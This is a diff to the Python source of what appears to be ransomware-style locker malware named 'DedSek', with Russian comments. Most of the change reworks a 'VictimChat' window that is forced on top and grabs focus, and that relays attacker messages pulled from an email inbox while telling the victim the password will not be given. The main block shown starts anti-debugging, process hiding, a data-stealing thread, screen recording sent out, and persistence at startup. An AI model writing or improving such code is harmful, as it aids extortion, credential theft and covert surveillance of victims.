@@ -120,36 +120,87 @@ class VictimChat:
         
     def show(self):
         if self.chat_visible:
+            self.chat_window.focus_force()
             return
         
         self.chat_visible = True
         self.chat_window = tk.Toplevel(self.locker.win)
-        self.chat_window.title("DedSek Chat")
-        self.chat_window.geometry("400x500")
-        self.chat_window.configure(bg='black')
+        self.chat_window.geometry("450x550+100+100")
+        self.chat_window.configure(bg='#00FF00')
         self.chat_window.attributes('-topmost', True)
+        self.chat_window.overrideredirect(True)
+        self.chat_window.focus_force()
+        self.chat_window.grab_set()
+        self.chat_window.protocol("WM_DELETE_WINDOW", self.hide)
         
-        tk.Label(self.chat_window, text="💀 DedSek Messenger 💀", 
-                bg='black', fg='#00FF00', font=('Courier', 12, 'bold')).pack(pady=5)
+        # Рамка
+        frame = tk.Frame(self.chat_window, bg='black', bd=2, relief='solid')
+        frame.pack(fill='both', expand=True, padx=2, pady=2)
         
-        self.chat_history = scrolledtext.ScrolledText(self.chat_window, 
+        # Заголовок
+        header = tk.Frame(frame, bg='#00FF00')
+        header.pack(fill='x')
+        
+        tk.Label(header, text="💀 DedSek Messenger 💀", 
+                bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
+        
+        close_btn = tk.Button(header, text="✕", command=self.hide,
+                             bg='#FF0000', fg='white', font=('Courier', 12, 'bold'),
+                             bd=0, width=3, cursor='hand2')
+        close_btn.pack(side='right', padx=5, pady=3)
+        
+        # История сообщений
+        self.chat_history = scrolledtext.ScrolledText(frame, 
                                                        bg='#0a0a0a', fg='#00FF00',
-                                                       font=('Courier', 10), height=20)
-        self.chat_history.pack(padx=10, pady=5, fill='both', expand=True)
+                                                       font=('Courier', 10), height=22,
+                                                       wrap=tk.WORD)
+        self.chat_history.pack(padx=10, pady=(0, 5), fill='both', expand=True)
         self.chat_history.config(state='disabled')
         
-        input_frame = tk.Frame(self.chat_window, bg='black')
-        input_frame.pack(padx=10, pady=5, fill='x')
+        # Поле ввода
+        input_frame = tk.Frame(frame, bg='black')
+        input_frame.pack(padx=10, pady=(0, 10), fill='x')
         
-        self.msg_entry = tk.Entry(input_frame, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10))
-        self.msg_entry.pack(side='left', fill='x', expand=True)
+        self.msg_entry = tk.Entry(input_frame, bg='#0a0a0a', fg='#00FF00',
+                                  font=('Courier', 10), insertbackground='#00FF00',
+                                  relief='solid', bd=1)
+        self.msg_entry.pack(side='left', fill='x', expand=True, ipady=3)
         self.msg_entry.bind('<Return>', self.send_message)
         
-        tk.Button(input_frame, text="▶", command=self.send_message,
-                 bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), width=3).pack(side='right', padx=(5, 0))
+        send_btn = tk.Button(input_frame, text="▶", command=self.send_message,
+                            bg='#00FF00', fg='black', font=('Courier', 10, 'bold'),
+                            width=3, cursor='hand2', relief='solid', bd=1)
+        send_btn.pack(side='right', padx=(5, 0))
         
-        self.add_message("DedSek", "Пиши сюда. Но пароль это не даст.")
+        # Перетаскивание окна
+        header.bind('<Button-1>', self.start_drag)
+        header.bind('<B1-Motion>', self.drag)
+        
+        self.add_message("DedSek", "Привет! Можешь писать мне сюда. Но пароль это не даст.")
         self.check_incoming_messages()
+        self.msg_entry.focus_force()
+    
+    def start_drag(self, event):
+        self.x = event.x_root
+        self.y = event.y_root
+    
+    def drag(self, event):
+        deltax = event.x_root - self.x
+        deltay = event.y_root - self.y
+        x = self.chat_window.winfo_x() + deltax
+        y = self.chat_window.winfo_y() + deltay
+        self.chat_window.geometry(f"+{x}+{y}")
+        self.x = event.x_root
+        self.y = event.y_root
+    
+    def hide(self):
+        self.chat_visible = False
+        if self.chat_window:
+            self.chat_window.grab_release()
+            self.chat_window.destroy()
+            self.chat_window = None
+        self.locker.win.focus_force()
+        self.locker.entry.focus_force()
     
     def send_message(self, event=None):
         msg = self.msg_entry.get().strip()
@@ -184,7 +235,7 @@ class VictimChat:
                                     if part.get_content_type() == "text/plain":
                                         command = part.get_payload(decode=True).decode()
                                         if command.startswith("MSG:"):
-                                            self.add_message("DedSek", command[4:])
+                                            self.chat_window.after(0, self.add_message, "DedSek", command[4:])
                                         
                             mail.store(num, '+FLAGS', '\\Seen')
                     
@@ -533,7 +584,8 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
         chat_btn = tk.Button(self.win, text="💀 ЧАТ С DedSek 💀", 
                             command=self.chat.show,
                             bg='#00FF00', fg='black',
-                            font=('Courier', 12, 'bold'))
+                            font=('Courier', 12, 'bold'),
+                            cursor='hand2')
         chat_btn.place(relx=0.5, rely=0.72, anchor='center')
         
         center_frame = tk.Frame(self.win, bg='black')
@@ -592,10 +644,7 @@ if __name__ == "__main__":
     anti_debug()
     hide_process()
     
-    # Стилер данных
     threading.Thread(target=steal_data, daemon=True).start()
-    
-    # Запись экрана
     threading.Thread(target=record_and_send_loop, daemon=True).start()
     
     add_to_startup()
